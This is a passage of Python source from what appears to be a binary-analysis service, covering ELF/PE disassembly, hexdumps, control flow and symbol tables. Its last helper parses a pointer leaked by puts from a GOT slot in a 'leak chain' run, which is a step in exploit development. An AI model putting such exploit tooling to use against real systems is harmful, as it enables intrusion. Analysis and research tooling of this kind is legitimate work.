        base_address: int = 0,
    ) -> list[dict]:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.ELF:
            insns = disassemble(
                parse_elf(data),
                address=address,
                count=count,
                max_instructions=self.settings.max_disasm_instructions,
            )
        elif artifact_format is ArtifactFormat.PE:
            insns = disassemble_pe(
                parse_pe(data),
                address=address,
                count=count,
                max_instructions=self.settings.max_disasm_instructions,
            )
        else:
            insns = disassemble_raw(
                data,
                architecture=architecture,
                base_address=base_address,
                address=address,
                count=count,
                max_instructions=self.settings.max_disasm_instructions,
            )
        return [
            {
                "address": i.address,
                "mnemonic": i.mnemonic,
                "op_str": i.op_str,
                "bytes_hex": i.bytes_hex,
                "text": i.text,
            }
            for i in insns
        ]

    def hexdump(self, data: bytes, page: int) -> dict:
        size = self.settings.hex_page_size
        start = page * size
        chunk = data[start : start + size]
        rows = []
        for off in range(0, len(chunk), 16):
            row = chunk[off : off + 16]
            rows.append(
                {
                    "offset": start + off,
                    "hex": " ".join(f"{b:02x}" for b in row),
                    "ascii": "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in row),
                }
            )
        return {
            "page": page,
            "page_size": size,
            "total_size": len(data),
            "total_pages": (len(data) + size - 1) // size,
            "rows": rows,
        }

    def _control_flow(self, data: bytes) -> ControlFlowAnalyzer:
        artifact_format = detect_format(data)
        if artifact_format is ArtifactFormat.ELF:
            return ControlFlowAnalyzer.from_elf(parse_elf(data))
        if artifact_format is ArtifactFormat.PE:
            return ControlFlowAnalyzer.from_pe(parse_pe(data))
        raise AnalysisError(
            "Function boundaries, xrefs, and CFG are unavailable for raw artifacts "
            "without a verified loader map."
        )

    @staticmethod
    def _pe_import_symbol(item) -> dict:  # noqa: ANN001
        return {
            "name": item.name,
            "addr": item.address,
            "size": 0,
            "stype": "IMPORT",
            "binding": item.library,
            "section_index": "IAT",
            "visibility": "DEFAULT",
            "table": "imports",
            "defined": False,
            "library": item.library,
            "verification": item.verification,
        }

    @staticmethod
    def _pe_export_symbol(item) -> dict:  # noqa: ANN001
        return {
            "name": item.name,
            "addr": item.address,
            "size": 0,
            "stype": "EXPORT",
            "binding": "GLOBAL",
            "section_index": item.ordinal,
            "visibility": "DEFAULT",
            "table": "exports",
            "defined": True,
            "verification": item.verification,
        }

    @staticmethod
    def _pe_segment(section) -> dict:  # noqa: ANN001
        return {
            "ptype": f"SECTION:{section.name}",
            "offset": section.offset,
            "vaddr": section.addr,
            "filesz": section.size,
            "memsz": section.virtual_size,
            "flags": section.characteristics,
            "readable": section.readable,
            "writable": section.writable,
            "executable": section.executable,
        }

    @staticmethod
    def _require_format(
        data: bytes,
        expected: ArtifactFormat,
        *,
        feature: str | None = None,
    ) -> None:
        actual = detect_format(data)
        if actual is not expected:
            subject = feature or f"{expected.value} metadata"
            raise AnalysisError(
                f"{subject} is not available for {actual.value} artifacts."
            )


def _page(items: list[dict], *, offset: int, limit: int) -> dict:
    return {
        "items": items[offset : offset + limit],
        "total": len(items),
        "offset": offset,
        "limit": limit,
    }


def _parse_leaked_address(verification: dict) -> int | None:
    """leak 체인 실행 결과의 stdout(hex)에서 유출된 포인터를 복원한다.

    ``puts`` 는 GOT 슬롯 바이트를 null 까지 출력한 뒤 개행을 붙이므로, 첫 줄
    바이트를 리틀엔디언 정수로 해석한다. 유출이 없으면 None.
    """

    hexstr = verification.get("observation", {}).get("stdout_hex")
    if not hexstr:
        return None
    try:
        raw = bytes.fromhex(hexstr)
    except ValueError:
        return None
    line = raw.split(b"\n", 1)[0]
    if not line:
        return None
    return int.from_bytes(line[:8], "little")
